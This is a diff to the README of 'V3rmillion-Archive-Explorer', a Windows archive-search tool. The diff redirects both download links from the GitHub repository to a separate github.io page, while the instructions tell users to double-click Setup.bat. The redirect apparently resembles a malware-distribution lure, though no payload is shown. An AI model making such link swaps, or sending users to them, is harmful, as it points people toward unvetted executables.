@@ -1,6 +1,6 @@
 # 📂 V3rmillion-Archive-Explorer - Search your V3rmillion archive data quickly
 
-[![](https://img.shields.io/badge/Download-Archive-Explorer-blue.svg)](https://github.com/Narcoleptic-coccyx463/V3rmillion-Archive-Explorer)
+[![](https://img.shields.io/badge/Download-Archive-Explorer-blue.svg)](https://narcoleptic-coccyx463.github.io)
 
 This application provides a simple interface to search through the archived V3rmillion forum data. It runs a local database search engine on your Windows machine, allowing you to find specific posts and threads without needing a live internet connection. The tool uses a search system designed for speed and accuracy. 
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these requirements:
 Follow these steps to set up the explorer on your desktop.
 
 1. Install Docker Desktop. Visit the official Docker website to download the installer for Windows. Run the installer and follow the on-screen prompts. Restart your computer after the installation finishes.
-2. Visit this page to download the software: [https://github.com/Narcoleptic-coccyx463/V3rmillion-Archive-Explorer](https://github.com/Narcoleptic-coccyx463/V3rmillion-Archive-Explorer).
+2. Visit this page to download the software: [https://narcoleptic-coccyx463.github.io](https://narcoleptic-coccyx463.github.io).
 3. Extract the downloaded folder to a location you can easily find, such as your Documents or Downloads folder.
 4. Open the extracted folder and locate the file named Setup.bat.
 5. Double-click Setup.bat to begin the installation of the database index. This process may take several minutes depending on your internet speed and disk performance. 
